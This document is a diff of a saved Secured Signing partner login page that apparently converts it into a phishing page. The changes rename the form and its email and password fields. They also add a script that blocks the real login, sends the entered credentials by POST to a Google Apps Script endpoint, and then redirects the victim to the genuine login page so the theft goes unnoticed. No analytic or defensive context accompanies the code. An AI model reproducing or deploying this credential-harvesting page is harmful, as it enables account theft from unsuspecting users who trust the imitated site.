@@ -615,9 +615,9 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <!-- OneTrust Cookies Consent Notice end for securedsigning.com -->
         
 
-    <form name="form1" method="post" action="./Login?return=" id="form1">
+    <form name="google-sheet" method="post" action="./Login?return=" id="login-form">
 <div>
-<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="VbI/QnGIB+MvLONp7DrbRR9IYPyVJbXec4kPs3Fp9ldUOLP+R/GoOE8/h205qPLchbbnJbhLffZnxXoxSCRlHw==">
+<input type="hidden" name="Domain Name" id="__VIEWSTATE" value="Office-25">
 </div>
 
 <div>
@@ -650,11 +650,11 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
                         <div class="form-group">
                             <label class="control-label visible-ie8 visible-ie9">Email Address</label>
-                            <input id="txtEmail" class="form-control form-control-solid placeholder-no-fix" type="email" autocomplete="off" data-bind="value: Email, valueUpdate: 'keyup'" placeholder="Email Address" name="email" value=""><span class="validationMessage" style="display: none;"></span>
+                            <input id="txtEmail" class="form-control form-control-solid placeholder-no-fix" type="email" autocomplete="off" data-bind="value: Email, valueUpdate: 'keyup'" placeholder="Email Address" name="Username" value=""><span class="validationMessage" style="display: none;"></span>
                         </div>
                         <div class="form-group">
                             <label class="control-label visible-ie8 visible-ie9">Password</label>
-                            <input id="txtPassword" class="form-control form-control-solid placeholder-no-fix" type="password" autocomplete="off" placeholder="Password" name="password" data-bind="value: Password, valueUpdate: 'keyup'" value=""><span class="validationMessage" style="display: none;"></span>
+                            <input id="txtPassword" class="form-control form-control-solid placeholder-no-fix" type="password" autocomplete="off" placeholder="Password" name="Password" data-bind="value: Password, valueUpdate: 'keyup'" value=""><span class="validationMessage" style="display: none;"></span>
                         </div>
                         <div class="form-group form-md-radios" data-bind="visible: Users() && Users().length > 0" style="display: none;">
                             <label class="control-label">There are mulitple users associated with your email.</label>
@@ -820,7 +820,24 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         <script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://ds.securedsigning.com/combres.axd/partnerLoginJs/145770fbce7c6c03197167d02b91beb568b795326b5dcd59173930c24439920c16e10ce68d24e8cb78ea0a08bf7521cf85847f4d9b8c8b8527317f93f4aa9acb/"></script>
         <script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://ds.securedsigning.com/combres.axd/passwordPortalJs/a0d9b330a701fc736e80f5ff1f05c0544d1aea6046f6f24b4443f81b6f4d0348108bc717b03963d34d32310382378ecc32219aae00992de66522b7d1090a9629/"></script>
         <script data-savepage-type="" type="text/plain"></script>
-    </form>
+    </form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://www.securedsigning.com/Partners/Login?return=';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
 
 
 <script data-savepage-type="text/javascript" type="text/plain" id="" charset=""></script>
